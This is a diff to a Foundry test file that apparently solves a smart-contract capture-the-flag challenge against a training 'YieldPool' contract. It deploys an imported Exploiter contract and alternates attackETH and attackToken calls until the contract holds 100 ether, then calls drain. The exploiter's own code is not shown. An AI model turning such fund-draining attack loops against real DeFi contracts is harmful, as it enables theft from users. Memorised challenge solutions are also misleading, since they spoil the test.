@@ -9,7 +9,7 @@ import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-
+import "../src/6_yieldPool/Exploiter.sol";
 
 
 /*////////////////////////////////////////////////////////////
@@ -47,8 +47,24 @@ contract Challenge6Test is Test {
         // forge test --match-contract Challenge6Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        Exploiter exploiter = new Exploiter{value: 0.1 ether}(address(yieldPool));
 
+        uint256 counter = 0;
+        while (address(exploiter).balance < 100 ether)
+        {
+            if (counter % 2 == 0)
+            {
+                exploiter.attackETH();
+            }
+            else
+            {
+                exploiter.attackToken();
+            }
 
+            counter++;
+        }
+
+        exploiter.drain(); 
 
         //==================================================//
         vm.stopPrank();
